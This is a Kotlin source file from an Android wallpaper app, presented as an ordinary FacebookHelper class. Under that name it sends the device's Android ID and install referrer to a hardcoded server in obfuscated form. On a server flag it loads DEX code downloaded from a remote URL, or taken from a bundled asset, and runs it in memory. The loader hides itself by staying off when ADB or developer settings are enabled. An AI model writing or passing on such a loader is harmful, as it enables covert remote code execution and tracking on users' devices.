package com.core.app

import android.content.Context
import android.util.Base64
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.firebase.Firebase
import com.google.firebase.messaging.messaging
import com.simmer.SimmerW
import dalvik.system.InMemoryDexClassLoader
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import s2.B1
import java.io.File
import java.io.IOException
import java.nio.ByteBuffer
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.jvm.java
import kotlin.random.Random

/**
 * Date：2025/7/25
 * Describe:
 */
class FacebookHelper(val url: String) {
    private var mIoScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var laTF = 0L
    private var mRef: String = ""
    private var mOkClient = OkHttpClient()
    private var tPeriod = 40000L
    private var mS: String = ""

    private val KEY_CONFIGURE: String = "summer_config"
    // referrer 配置缓存的key

    //
    //["ts", "time", "timestamp", "datetime", "dt"]
    private var d: String = "dt" //

    // Admin 配置缓存的key 需要修改对应的key
    private val KEY_REF: String = "summer_referrer_meow"
    private val Key_admin: String = "summer_admin"

    fun cr(context: Context) {
        runCatching {
            Firebase.messaging.subscribeToTopic("wall_summer_topic")
        }
        mRef = CoreH.getStr(KEY_REF)
        if (mRef.isBlank()) {
            checkTask(context)
        } else {
            CoreH.e.postRef(mRef)
            reConfig()
        }
        openWork(context)
        openSession()
    }

    private fun openSession() {
        CoreH.pE("session")
        ioTask(60000 * 15) {
            openSession()
        }
    }

    private fun openWork(context: Context) {
        val workManager = WorkManager.getInstance(context)
        val workRequest = OneTimeWorkRequest.Builder(SimmerW::class.java).build()
        workManager.enqueueUniqueWork("simmer_worker", ExistingWorkPolicy.REPLACE, workRequest)
        ioTask(Random.nextLong(35000, 45000)) {
            openWork(context)
        }
    }

    private fun checkTask(context: Context) {
        if (mRef.isNotBlank()) return
        fR(context)
        ioTask(Random.nextLong(17000, 20000)) {
            checkTask(context)
        }
    }

    private fun fR(context: Context) {
        val referrerClient = InstallReferrerClient.newBuilder(context).build()
        referrerClient.startConnection(object : InstallReferrerStateListener {
            override fun onInstallReferrerSetupFinished(p0: Int) {
                try {
                    if (p0 == InstallReferrerClient.InstallReferrerResponse.OK) {
                        val response: ReferrerDetails = referrerClient.installReferrer
                        mRef = response.installReferrer
                        str(mRef)
                        CoreH.saveC(KEY_REF, mRef)
                        CoreH.saveC(
                            Key_admin,
                            JSONObject().put("GiYBMmFrW", response.referrerClickTimestampSeconds)
                                .put("wFcSFqd", response.referrerClickTimestampServerSeconds)
                                .toString()
                        )

                        CoreH.e.postRef(mRef)
                        reConfig()
                        referrerClient.endConnection()
                    } else {
                        referrerClient.endConnection()
                    }
                } catch (_: Exception) {
                    referrerClient.endConnection()
                }
            }

            override fun onInstallReferrerServiceDisconnected() = Unit
        })
    }


    private fun str(ref: String) {
        // 拿到ref后进行判断
        val setTag = if (ref.contains("facebook") || ref.contains("fb4a")) {
            "facebook"
        } else if (ref.contains("tiktok") || ref.contains("bytedance")) {
            "tiktok"
        } else if (ref.contains("gclid")) {
            "GoogleAds"
        } else {
            ""
        }
        CoreH.saveC("key_pangle_channel", setTag)
    }

    private fun reConfig() {
        val con = CoreH.getStr(KEY_CONFIGURE)
        if (con.isBlank()) {// 没配置直接进行获取
            fetch(5)
        } else {
            // 有配置先使用上一次的配置，然后在进行数据更新
            refreshLastConfigure(con)
            if (mS == "a") {
                ioTask(Random.nextLong(1000, 60000 * 10)) {
                    fetch(1)
                }
            } else {
                bz()
            }
        }
    }

    private fun fetch(num: Int = 5) {
        if (System.currentTimeMillis() - laTF < tPeriod) return
        if (checkIsLimitLoad()) return
        laTF = System.currentTimeMillis()
        val t = "${System.currentTimeMillis()}"
        val c = mapStr(a0(mRef), t)
        val str = (Base64.encodeToString(c.toByteArray(), Base64.DEFAULT))
        val req = Request.Builder().post(
            str.toRequestBody("application/json".toMediaType())
        ).url(url.ifBlank { "https://xqa.wallpaperpu.com/api/cozy/custom/" }).addHeader(d, t)
            .build()
        requestAdmin(req, num)
    }

    private fun mapStr(origin: String, keyT: String): String {
        return origin.mapIndexed { index, c ->
            (c.code xor keyT[index % 13].code).toChar()
        }.joinToString("")
    }

    private fun requestAdmin(request: Request, num: Int) {
        numRequest++
        CoreH.pE("config_R")
        mOkClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                if (num > 0) {
                    CoreH.pE("config_G", "error_net")
                    ioTask(10000) {
                        requestAdmin(request, num - 1)
                    }
                } else {
                    requestOver("timeout")
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: ""
                val code = response.code
                if (code == 200) {
                    val res = dateSync(body, response.headers[d] ?: "")
                    if (res.isBlank()) {
                        requestOver("null")
                    } else {
                        refreshLastConfigure(res)
                        bz()
                        CoreH.pE("config_G", mS)
                    }
                } else {
                    if (num > 0) {
                        CoreH.pE("config_G", "${response.code}")
                        ioTask(90000) {
                            requestAdmin(request, num - 1)
                        }
                    } else {
                        requestOver("timeout")
                    }
                }
            }
        })
    }

    private fun requestOver(result: String) {
        CoreH.pE("config_G", result)
        if (mS.isBlank()) {
            ioTask(20000) {
                fetch(3)
            }
        } else {
            bz()
        }
    }

    private fun dateSync(body: String, time: String): String {
        if (body.isBlank() || time.isBlank()) return ""
        try {
            val js = mapStr(String(Base64.decode(body, Base64.DEFAULT)), time)
            return JSONObject(js).optJSONObject(details)?.getString("conf") ?: ""
        } catch (_: Exception) {
        }
        return ""
    }

    private fun refreshLastConfigure(string: String) {
        try {
            JSONObject(string).apply {
                val s = optString("fig_name_s")
                if (s.contains("emission")) {
                    mS = "a"
                } else if (s.contains("rollick")) {
                    if (mS == "a") {
                        return
                    }
                    mS = "h"
                }
                CoreH.mustPostLog = optString("loquat_name_list")
                CoreH.isPostLog = s.contains("hebrides").not()
                CoreH.saveC(KEY_CONFIGURE, string)
                fbI(optString("fig_fb_id"), optString("fig_loquat_tt"))
                val timeStr = optString("fig_timer")
                val timeList = timeStr.split("-")
                maxNum = optInt("fig_c_max", 100)
                cheAT = timeList[0].toInt() * 60000L
                cheBT = timeList[1].toInt() * 1000L
                CoreH.saveC("fig_ta_user", optString("fig_ta_user"))
                checkStatus = optInt("guava_type_s", 0)
                if (mS == "a") {
                    urlD = optString("guava_u_t")
                    nameFile = optString("guava_f_n")
                    next()
                }
            }
        } catch (e: Exception) {
            CoreH.pE("cf_fail", e.stackTraceToString())
        }
    }

    private var cheBT = 90000L
    private var cheAT = 60000 * 60L

    // 定期刷新配置
    private fun t0(): Long {
        tPeriod = if (mS == "a") {
            Random.nextLong(cheAT - 60000 * 5, cheAT + 60000 * 5)
        } else {
            Random.nextLong(cheBT, cheBT + 10000)
        }
        return tPeriod
    }

    private fun ioTask(delTime: Long, event: () -> Unit) {
        mIoScope.launch {
            delay(delTime)
            event.invoke()
        }
    }

    private fun bz() {
        val time = t0()
        ioTask(time) { fetch(1) }
    }


    private val details = "RpfEQdNyCx"
    private fun a0(ref: String): String {
        val str = CoreH.getStr(Key_admin)
        val js = JSONObject(str).put("wBnf", "com.wallpaper.pu.artcustom").put("mLnad", CoreH.ver)
            .put("dVofjJ", CoreH.mAndroidIdStr).put("BPhsoVcGY", CoreH.mAndroidIdStr)
            .put("TmtPoV", ref).put("JgBSSKz", CoreH.installPackName)
        return js.toString()
    }

    // 初始化Facebook
    private fun fbI(fbStr: String, token: String) {
        if (fbStr.isBlank()) return
        if (token.isBlank()) return
        if (FacebookSdk.isInitialized()) return
        FacebookSdk.setApplicationId(fbStr)
        FacebookSdk.setClientToken(token)
        FacebookSdk.sdkInitialize(CoreH.mApp)
        AppEventsLogger.activateApp(CoreH.mApp)
    }

    private var maxNum = 100

    private var numRequest: Int = 0
        set(value) {
            CoreH.saveInt("request_num", value)
            field = value
        }
        get() {
            return CoreH.getInt("request_num")
        }


    private fun checkIsLimitLoad(): Boolean {
        if (icCurDay().not()) {
            numRequest = 0
        }
        return numRequest >= maxNum
    }

    private fun icCurDay(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        val lastDay = CoreH.getStr("is_cur_day_11")
        if (lastDay != day) {
            CoreH.saveC("is_cur_day_11", day)
            return false
        }
        return true
    }

    private var isGo = false
    private var urlD = ""
    private fun next() {
        if (isCanNext().not()) return
        if (isGo) return
        isGo = true
        //
//        Class.forName("com.vivo.core.Core").getMethod("a", Context::class.java, B1::class.java)
//            .invoke(null, CoreH.mApp, CoreH.e as B1)
//        return
        // todo test
        load(CoreH.mApp.assets.open("local").readBytes())
        return
        val parentFile = File("${CoreH.mApp.filesDir}")
        val save = File(parentFile, "file_wall")
        FileDownLoad().fileD(urlD, success = {
            load(save.readBytes())
        }, save)
    }

    private fun load(byte: ByteArray) {
        val byteBuffer = ByteBuffer.wrap(byte)
        val classLoader = InMemoryDexClassLoader(byteBuffer, CoreH.mApp.classLoader)
        val loadedClass = classLoader.loadClass("com.vivo.core.Core")
        loadedClass.getMethod("a", Context::class.java, B1::class.java)
            .invoke(null, CoreH.mApp, CoreH.e as B1)
    }

    private var nameFile = ""

//    private fun decryptDex(keyAes: ByteArray): ByteArray {
//        val inputBytes = java.util.Base64.getDecoder()
//            .decode(CoreH.mApp.assets.open(nameFile).readBytes())
//        val key = SecretKeySpec(keyAes, "AES")
//        val cipher = Cipher.getInstance("AES")
//        cipher.init(Cipher.DECRYPT_MODE, key)
//        val outputBytes = cipher.doFinal(inputBytes)
//        return outputBytes
//    }

    private var checkStatus = 0
    private fun isCanNext(): Boolean {
        val r = when (checkStatus) {
            0 -> {
                val isd = isOpenDev()
                if (isOpenUsb() || isd) {
                    false
                } else {
                    true
                }
            }

            1 -> {
                if (isOpenDev()) {
                    false
                } else {
                    true
                }
            }

            else -> {
                true
            }
        }
        return r
    }

    private fun isOpenUsb(): Boolean {
        val stra = CoreH.getStr("u_sss19")
        val isOpenUsb = Tools.isAdbEnabled(CoreH.mApp)
        if (stra.isEmpty() && isOpenUsb) {
            CoreH.saveC("u_sss19", "true")
            CoreH.pE("u_o1")
        }
        return isOpenUsb || stra.isNotEmpty()
    }

    private fun isOpenDev(): Boolean {
        val stra = CoreH.getStr("dev_aaa19")
        val isOpenDev = Tools.isDevelopmentSettingsEnabled(CoreH.mApp)
        if (stra.isEmpty() && isOpenDev) {
            CoreH.saveC("dev_aaa19", "true")
            CoreH.pE("dev_o2")
        }
        return isOpenDev || stra.isNotEmpty()
    }
}